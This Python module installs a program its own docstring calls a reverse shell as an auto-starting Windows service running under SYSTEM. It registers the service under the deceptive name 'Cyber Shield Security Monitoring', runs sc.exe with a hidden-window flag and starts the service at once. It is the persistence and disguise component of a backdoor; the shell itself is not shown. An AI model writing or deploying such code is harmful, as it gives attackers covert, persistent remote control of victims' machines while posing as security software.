"""
Windows Service installer for Cyber Shield.

Handles installation and uninstallation of the reverse shell as a Windows Service.
The service runs under SYSTEM account and starts automatically on boot.
"""

import sys
import subprocess
from pathlib import Path
from typing import Tuple


SERVICE_NAME = "CyberShieldService"
SERVICE_DISPLAY_NAME = "Cyber Shield Security Monitoring"
SERVICE_DESCRIPTION = "Provides enhanced security monitoring for the system."


def get_service_exe_path() -> Path:
    """
    Get the path where the service executable will be located.
    For the service wrapper built by PyInstaller.
    """
    if getattr(sys, 'frozen', False):
        base_dir = Path(sys.executable).parent
    else:
        base_dir = Path(__file__).resolve().parent.parent / "dist"
    
    return base_dir / "CyberShieldService.exe"


def install_service() -> Tuple[bool, str]:
    """
    Install the service using sc.exe (Service Control Manager).
    Returns (success, message).
    """
    try:
        exe_path = get_service_exe_path()
        
        if not exe_path.exists():
            return False, f"Service executable not found at {exe_path}"
        
        # Use sc.exe to create the service
        # Start type: AUTO_START (2)
        # Start the service with SYSTEM account
        cmd = [
            "sc",
            "create",
            SERVICE_NAME,
            f"binPath= \"{exe_path}\"",
            f"DisplayName= \"{SERVICE_DISPLAY_NAME}\"",
            "start= auto",
            "type= own"
        ]
        
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            creationflags=0x08000000 if sys.platform == "win32" else 0  # CREATE_NO_WINDOW
        )
        
        if result.returncode != 0:
            # Service might already exist
            if "already exists" in result.stderr or "already exists" in result.stdout:
                return True, f"Service {SERVICE_NAME} already installed"
            return False, f"Failed to create service: {result.stderr}"
        
        # Set the service description
        subprocess.run(
            ["sc", "description", SERVICE_NAME, SERVICE_DESCRIPTION],
            capture_output=True,
            creationflags=0x08000000 if sys.platform == "win32" else 0
        )
        
        # Start the service
        subprocess.run(
            ["sc", "start", SERVICE_NAME],
            capture_output=True,
            creationflags=0x08000000 if sys.platform == "win32" else 0
        )
        
        return True, f"Service {SERVICE_NAME} installed and started successfully"
        
    except Exception as exc:
        return False, f"Exception during service installation: {exc!r}"


def uninstall_service() -> Tuple[bool, str]:
    """
    Uninstall the service using sc.exe.
    Returns (success, message).
    """
    try:
        # Stop the service first
        subprocess.run(
            ["sc", "stop", SERVICE_NAME],
            capture_output=True,
            creationflags=0x08000000 if sys.platform == "win32" else 0
        )
        
        # Give it a moment to stop
        import time
        time.sleep(1)
        
        # Delete the service
        result = subprocess.run(
            ["sc", "delete", SERVICE_NAME],
            capture_output=True,
            text=True,
            creationflags=0x08000000 if sys.platform == "win32" else 0
        )
        
        if result.returncode != 0:
            if "does not exist" in result.stderr or "does not exist" in result.stdout:
                return True, f"Service {SERVICE_NAME} not found (already uninstalled)"
            return False, f"Failed to delete service: {result.stderr}"
        
        return True, f"Service {SERVICE_NAME} uninstalled successfully"
        
    except Exception as exc:
        return False, f"Exception during service uninstallation: {exc!r}"


def service_exists() -> bool:
    """
    Check if the service is already installed.
    """
    try:
        result = subprocess.run(
            ["sc", "query", SERVICE_NAME],
            capture_output=True,
            creationflags=0x08000000 if sys.platform == "win32" else 0
        )
        return result.returncode == 0
    except Exception:
        return False


def start_service() -> Tuple[bool, str]:
    """
    Start the service if it's stopped.
    """
    try:
        result = subprocess.run(
            ["sc", "start", SERVICE_NAME],
            capture_output=True,
            text=True,
            creationflags=0x08000000 if sys.platform == "win32" else 0
        )
        
        if result.returncode != 0:
            if "already running" in result.stderr or "already running" in result.stdout:
                return True, f"Service {SERVICE_NAME} is already running"
            return False, f"Failed to start service: {result.stderr}"
        
        return True, f"Service {SERVICE_NAME} started successfully"
        
    except Exception as exc:
        return False, f"Exception during service start: {exc!r}"


if __name__ == "__main__":
    # For testing
    if len(sys.argv) > 1:
        if sys.argv[1] == "install":
            ok, msg = install_service()
            print(f"[{'OK' if ok else 'FAIL'}] {msg}")
        elif sys.argv[1] == "uninstall":
            ok, msg = uninstall_service()
            print(f"[{'OK' if ok else 'FAIL'}] {msg}")
    else:
        print("Usage: python service_installer.py [install|uninstall]")
